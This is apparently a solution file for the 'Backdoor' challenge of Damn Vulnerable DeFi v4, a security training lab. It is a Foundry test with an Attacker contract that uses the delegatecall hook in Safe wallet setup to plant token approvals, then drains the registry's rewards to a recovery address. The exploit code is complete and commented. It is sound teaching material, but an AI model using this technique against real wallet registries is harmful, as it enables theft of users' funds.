// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {
    SafeProxyFactory
} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract Attacker {
    Safe immutable safe;
    SafeProxyFactory immutable safeproxyfactory;
    DamnValuableToken immutable token;
    WalletRegistry immutable wallet;
    address[] users;
    address recovery;

    constructor(
        Safe _safe,
        SafeProxyFactory _safeproxyfactory,
        DamnValuableToken _token,
        WalletRegistry _wallet,
        address[] memory _users,
        address _recovery
    ) {
        safe = _safe;
        safeproxyfactory = _safeproxyfactory;
        token = _token;
        wallet = _wallet;
        users = _users;
        recovery = _recovery;
    }

    function proxy_attacker() external {
        for (uint256 i = 0; i < users.length; i++) {
            // Each Safe has one owner: the beneficiary expected by the registry.
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            // This runs through delegatecall during the Safe setup.
            // So the approval is stored as if the Safe did it itself.
            bytes memory data = abi.encodeWithSelector(
                this.approve.selector,
                address(token),
                address(this)
            );

            // The registry mostly checks owners, threshold and fallbackHandler.
            // The "to" field is still free, so this is the backdoor.
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners,
                1,
                address(this),
                data,
                address(0),
                address(0),
                0,
                payable(address(0))
            );

            // Create the Safe and call back into the registry.
            // If everything looks valid, the registry sends it 10 DVT.
            SafeProxy createdSafe = safeproxyfactory.createProxyWithCallback(
                address(safe),
                initializer,
                i,
                wallet
            );

            // The Safe approved us during setup, so we can pull its 10 DVT.
            token.transferFrom(address(createdSafe), recovery, 10e18);
        }
    }

    // Called by the Safe with delegatecall during setup.
    // For the token, msg.sender becomes the Safe address.
    function approve(address tokenAddress, address spender) external {
        DamnValuableToken(tokenAddress).approve(spender, 10e18);
    }
}
contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [
        makeAddr("alice"),
        makeAddr("bob"),
        makeAddr("charlie"),
        makeAddr("david")
    ];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(singletonCopy),
            address(walletFactory),
            address(token),
            users
        );

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(
            token.balanceOf(address(walletRegistry)),
            AMOUNT_TOKENS_DISTRIBUTED
        );
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        // One player tx: deploy the contract, then run the whole loop.
        Attacker attacker = new Attacker(
            singletonCopy,
            walletFactory,
            token,
            walletRegistry,
            users,
            recovery
        );
        attacker.proxy_attacker();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
